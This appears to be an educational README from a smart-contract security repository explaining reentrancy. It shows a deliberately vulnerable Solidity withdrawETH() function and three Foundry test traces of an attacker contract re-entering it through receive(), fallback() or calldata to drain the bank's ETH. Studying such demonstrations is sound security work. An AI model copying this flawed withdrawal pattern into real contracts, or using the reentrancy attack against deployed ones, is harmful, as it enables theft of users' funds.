# SC05 - Reentrancy Attacks	

Reentrancy attacks exploit the ability to reenter a vulnerable function before its execution is complete. This can lead to repeated state changes, often resulting in drained contract funds or broken logic.


In this scenario, we are dealing with International Bank: an online and international banking system that allows a user to `depositETH()`, `withdrawETH()` and `getContractBalance()`.
An issue arises within our `withdrawETH()` function:
```javascript
function withdrawETH() public {
        uint256 userBalance = userToETHDepositedBalance[msg.sender];
        require(userBalance > 0, "You do not have enough balance to withdraw. Please deposit first.");
        (bool success,) = msg.sender.call{value: userBalance}("");
        require(success, "Transfer failed.");

        userToETHDepositedBalance[msg.sender] = 0;
    }
```

We can see that the function makes the external call to the user/contract wallet to transfer their ETH back to them and THEN it updates the state variable within the contract. This way, an attacker could initialize a `fallback()` or `receive()` function within their receiving logic that will get triggered by the `call` from the InternationalBank logic which will allow them to keep re-entering the withdraw function and absorb all of the contract funds before the state variable that's holding each user's balance gets updated to zero.

In this repo, I have created three example for this vulnerability:
- Example 1: The `withdrawETH()` function makes an external call with no calldata; The attacker contract has both a `receive()` and `fallback()` functions implemented. This will trigger the `receive()` function within the receiving contract:
```javascript
$ forge test -vvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/WorkflowTest.t.sol:WorkflowTest
[PASS] testAttackerCanStealAllETH() (gas: 114525)
Traces:
  [134425] WorkflowTest::testAttackerCanStealAllETH()
    ├─ [0] VM::deal(Kujen: [0xB3D7990B15A8e4707330Ad9f56658E854fa21F88], 10000000000000000000 [1e19])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(Kujen: [0xB3D7990B15A8e4707330Ad9f56658E854fa21F88])
    │   └─ ← [Return] 
    ├─ [22435] InternationalBank::depositETH{value: 5000000000000000000}()
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
    │   └─ ← [Return] 
    ├─ [81041] Attacker::Steal{value: 1000000000000000000}()
    │   ├─ [22435] InternationalBank::depositETH{value: 1000000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [48831] InternationalBank::withdrawETH()
@>    │   │   ├─ [41386] Attacker::receive{value: 1000000000000000000}()
    │   │   │   ├─ [40614] InternationalBank::withdrawETH()
    │   │   │   │   ├─ [33169] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   ├─ [32397] InternationalBank::withdrawETH()
    │   │   │   │   │   │   ├─ [24952] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   ├─ [24180] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   ├─ [16735] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   ├─ [15963] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   │   │   ├─ [8518] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   ├─ [7746] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [301] Attacker::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(6000000000000000000 [6e18], 6000000000000000000 [6e18]) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 15.52ms (3.04ms CPU time)

Ran 1 test suite in 73.30ms (15.52ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
```diff
+    │   │   ├─ [41386] Attacker::receive{value: 1000000000000000000}()
```

- Example 2: The `withdrawETH()` function makes an external call with no calldata; The attacker contract has only a `fallback()` function implemented. This will trigger the `fallback()` function within the receiving contract:
```javascript
$ forge test -vvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/WorkflowTest.t.sol:WorkflowTest
[PASS] testAttackerCanStealAllETH() (gas: 114435)
Traces:
  [134335] WorkflowTest::testAttackerCanStealAllETH()
    ├─ [0] VM::deal(Kujen: [0xB3D7990B15A8e4707330Ad9f56658E854fa21F88], 10000000000000000000 [1e19])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(Kujen: [0xB3D7990B15A8e4707330Ad9f56658E854fa21F88])
    │   └─ ← [Return] 
    ├─ [22435] InternationalBank::depositETH{value: 5000000000000000000}()
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
    │   └─ ← [Return] 
    ├─ [80951] Attacker::Steal{value: 1000000000000000000}()
    │   ├─ [22435] InternationalBank::depositETH{value: 1000000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [48741] InternationalBank::withdrawETH()
@>    │   │   ├─ [41296] Attacker::fallback{value: 1000000000000000000}()
    │   │   │   ├─ [40539] InternationalBank::withdrawETH()
    │   │   │   │   ├─ [33094] Attacker::fallback{value: 1000000000000000000}()
    │   │   │   │   │   ├─ [32337] InternationalBank::withdrawETH()
    │   │   │   │   │   │   ├─ [24892] Attacker::fallback{value: 1000000000000000000}()
    │   │   │   │   │   │   │   ├─ [24135] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   ├─ [16690] Attacker::fallback{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   ├─ [15933] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   │   │   ├─ [8488] Attacker::fallback{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   ├─ [7731] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [286] Attacker::fallback{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(6000000000000000000 [6e18], 6000000000000000000 [6e18]) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 860.25µs (245.63µs CPU time)

Ran 1 test suite in 7.97ms (860.25µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
```diff
+    │   │   ├─ [41296] Attacker::fallback{value: 1000000000000000000}()
```

- Example 3: The `withdrawETH()` function makes an external call with calldata; The attacker contract has a `fallback()` and `receive()` functions implemented. This will trigger the `fallback()` function within the receiving contract in the case of the calldata not matching any function selector on the called contract. However, if the calldata does match a function selector, then that function will be called instead of `fallback()` (do note that the function selector to be called is the first 4 bytes of the kaccak-256 hash of the calldata):
```javascript
$ forge test -vvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for test/WorkflowTest.t.sol:WorkflowTest
[PASS] testAttackerCanStealAllETH() (gas: 115305)
Traces:
  [135205] WorkflowTest::testAttackerCanStealAllETH()
    ├─ [0] VM::deal(Kujen: [0xB3D7990B15A8e4707330Ad9f56658E854fa21F88], 10000000000000000000 [1e19])
    │   └─ ← [Return] 
    ├─ [0] VM::prank(Kujen: [0xB3D7990B15A8e4707330Ad9f56658E854fa21F88])
    │   └─ ← [Return] 
    ├─ [22435] InternationalBank::depositETH{value: 5000000000000000000}()
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18]) [staticcall]
    │   └─ ← [Return] 
    ├─ [81821] Attacker::Steal{value: 1000000000000000000}()
    │   ├─ [22435] InternationalBank::depositETH{value: 1000000000000000000}()
    │   │   └─ ← [Stop] 
    │   ├─ [49611] InternationalBank::withdrawETH()
@>    │   │   ├─ [42131] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
    │   │   │   ├─ [41264] InternationalBank::withdrawETH()
    │   │   │   │   ├─ [33784] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
    │   │   │   │   │   ├─ [32917] InternationalBank::withdrawETH()
    │   │   │   │   │   │   ├─ [25437] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
    │   │   │   │   │   │   │   ├─ [24570] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   ├─ [17090] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
    │   │   │   │   │   │   │   │   │   ├─ [16223] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   │   │   ├─ [8743] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
    │   │   │   │   │   │   │   │   │   │   │   ├─ [7876] InternationalBank::withdrawETH()
    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [396] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return] 
    ├─ [0] VM::assertEq(6000000000000000000 [6e18], 6000000000000000000 [6e18]) [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 865.30µs (262.21µs CPU time)

Ran 1 test suite in 729.78ms (865.30µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
```diff
+    │   │   ├─ [42131] Attacker::52616e64{value: 1000000000000000000}(6f6d2063616c6c64617461)
```


